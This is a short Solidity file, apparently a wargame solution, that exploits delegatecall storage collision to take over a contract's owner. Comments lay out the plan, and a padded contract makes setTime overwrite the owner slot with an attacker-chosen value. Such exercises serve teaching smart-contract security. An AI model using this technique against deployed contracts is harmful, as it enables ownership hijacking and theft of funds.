// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Need to set up my own library contract, stuff the first memory slots, 
// Then call it so it resets the owner memory slot to be mine.
// TO call it i push in its address into the first memory slot that is overwriting useing the bad librarys, 
// then it will call my bad contract from there as the memory has been corrupted

contract SpecialLibraryContract {
  address public fillerAddresSlot0;
  address public fillerAddresSlot1;
  // Pad first 2 slots so owner aligns
  uint public storedTime;
  // We will feed our desired owner in with this
  function setTime(uint256 _time) public {
    storedTime = _time;
  }
}